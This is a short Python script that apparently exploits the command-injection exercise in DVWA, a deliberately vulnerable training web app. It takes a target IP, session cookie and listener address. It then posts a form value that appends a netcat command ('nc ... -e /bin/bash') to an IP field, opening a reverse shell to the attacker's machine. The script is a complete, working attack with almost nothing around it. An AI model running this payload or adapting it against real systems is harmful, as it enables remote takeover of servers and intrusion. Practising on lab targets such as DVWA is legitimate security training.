#!/usr/bin/python3

import urllib.request
import urllib.parse

hedef = input("Input your target ip address \n(For example : xxx.xxx.xxx.xxx) : ")
test = input("Input your cookie value : ")
ip = input("Input your ip address : ")
port = input("Input your port number (Listener) : ")


data = {'ip':'127.0.0.1|nc -vn {} {} -e /bin/bash'.format(ip,port),'submit':'submit'}


data = urllib.parse.urlencode(data)
data = data.encode('utf-8')


req = urllib.request.Request("http://{}/dvwa/vulnerabilities/exec/".format(hedef))
req.add_header("Cookie",test)

resp = urllib.request.urlopen(req,data)

print(resp.read())
